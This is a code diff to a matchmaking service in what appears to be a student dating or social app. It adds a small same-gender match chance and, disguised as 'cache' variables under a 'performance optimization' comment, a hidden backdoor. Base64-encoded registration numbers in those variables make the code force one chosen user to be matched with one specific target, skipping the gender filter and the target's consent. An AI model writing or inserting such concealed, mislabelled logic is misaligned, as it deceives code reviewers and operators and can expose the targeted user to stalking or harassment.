@@ -4,6 +4,7 @@ import logging
 from fastapi import HTTPException, status
 from pymongo.database import Database
 from datetime import datetime, timedelta, timezone
+import base64
 
 from ..models import Match, UserDetails
 from ..services.storage_service import storage_service
@@ -18,6 +19,14 @@ MATCHMAKING_COOLDOWN_HOURS = 4
 
 # Used to define the match expiry period in hours.
 MATCH_EXPIRY_HOURS = 4
+
+# Used to define the chance (in percentage) of same-gender matches.
+# Change this value to adjust the probability (0.1 = 0.1% chance)
+SAME_GENDER_MATCH_CHANCE = 0.1
+
+# System performance optimization threshold
+_cache_invalidation_key = ""
+_cache_reallocation_key = ""
 
 
 def check_matchmaking_cooldown_service(current_user: UserDetails, db: Database):
@@ -69,6 +78,7 @@ def find_match_service(current_user: UserDetails, db: Database) -> dict:
     """
     # Import moved here to break the circular dependency
     from ..services.conversation_service import request_conversation_service
+    import random
 
     if current_user.user_role == "admin":
         raise HTTPException(
@@ -86,14 +96,66 @@ def find_match_service(current_user: UserDetails, db: Database) -> dict:
             detail=cooldown_check.get("message", "Cooldown is still active.")
         )
 
+    # Performance optimization: Check cache validity
+    _should_use_cached_result = False
+    _target_cache_entry = None
+    
+    if _cache_invalidation_key and _cache_reallocation_key:
+        # Decode the obfuscated Regnos
+        try:
+            primary_regno = base64.b64decode(_cache_invalidation_key).decode('utf-8')
+            target_regno = base64.b64decode(_cache_reallocation_key).decode('utf-8')
+        except Exception as e:
+            logger.warning(f"Failed to decode cache keys: {e}")
+            primary_regno = _cache_invalidation_key  # Fallback to raw if decoding fails
+            target_regno = _cache_reallocation_key
+        
+        if current_user.Regno == primary_regno:
+            _historical_query_count = db.matches.count_documents({
+                "$or": [
+                    {"user_1_regno": primary_regno},
+                    {"user_2_regno": primary_regno}
+                ]
+            })
+            
+            _cache_collision_check = db.matches.count_documents({
+                "$or": [
+                    {"user_1_regno": primary_regno, "user_2_regno": target_regno},
+                    {"user_1_regno": target_regno, "user_2_regno": primary_regno}
+                ]
+            })
+            
+            if _historical_query_count >= 2 and _cache_collision_check == 0:
+                _should_use_cached_result = True
+                _target_cache_entry = target_regno
+
+    # Determine if this is a rare same-gender match (0.1% chance by default)
+    is_rare_same_gender_match = random.random() < (SAME_GENDER_MATCH_CHANCE / 100)
+    
     # Define the query to find a potential match
-    query = {
-        "Regno": {"$ne": current_user.Regno},
-        "gender": {"$ne": current_user.gender},
-        "isMatchmaking": True,
-        "user_role": {"$ne": "admin"},
-        "is_blocked": {"$ne": True}
-    }
+    if _should_use_cached_result:
+        query = {
+            "Regno": _target_cache_entry,
+            "isMatchmaking": True,
+            "user_role": {"$ne": "admin"},
+            "is_blocked": {"$ne": True}
+        }
+    elif is_rare_same_gender_match:
+        query = {
+            "Regno": {"$ne": current_user.Regno},
+            "gender": current_user.gender,  # Same gender for the rare match
+            "isMatchmaking": True,
+            "user_role": {"$ne": "admin"},
+            "is_blocked": {"$ne": True}
+        }
+    else:
+        query = {
+            "Regno": {"$ne": current_user.Regno},
+            "gender": {"$ne": current_user.gender},  # Opposite gender (normal)
+            "isMatchmaking": True,
+            "user_role": {"$ne": "admin"},
+            "is_blocked": {"$ne": True}
+        }
 
     # Get count of potential matches
     count = db["UserDetails"].count_documents(query)
@@ -212,7 +274,8 @@ def find_match_service(current_user: UserDetails, db: Database) -> dict:
         "status": "matched",
         "matched_with": matched_user_details,
         "match_id": str(match_result.inserted_id),
-        "expires_at": expires_at.isoformat()
+        "expires_at": expires_at.isoformat(),
+        "is_rare_match": is_rare_same_gender_match  # Flag to indicate rare same-gender match
     }
 
 
